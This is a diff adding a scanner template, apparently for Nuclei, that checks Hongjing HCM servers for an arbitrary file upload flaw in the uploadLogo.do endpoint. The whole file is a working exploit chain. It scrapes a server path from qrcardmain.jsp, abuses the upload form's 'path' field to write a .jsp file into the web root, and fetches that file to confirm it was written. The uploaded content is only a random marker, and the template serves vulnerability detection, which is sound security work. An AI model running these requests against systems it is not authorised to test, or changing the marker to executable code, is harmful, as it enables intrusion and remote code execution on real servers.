@@ -1,0 +1,92 @@
+id: hongjingHCM-uploadLogo-upload
+
+info:
+  name: 宏景HCM的uploadLogo任意文件上传漏洞
+  author: hongjingHCM
+  severity: high
+  tags: hongjingHCM
+
+http:
+  - raw:
+      - |+
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+        
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="path"
+        
+        
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="lfType"
+        
+        0
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+        
+        1
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+        
+        1
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+        
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="path"
+        
+        {{paths}}rc6sd9e.jsp
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="lfType"
+        
+        0
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+        
+        1
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+        
+        {{randstr_1}}
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+      - |+
+        GET /rc6sd9e.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - 'value="(.*?)images"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_4
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
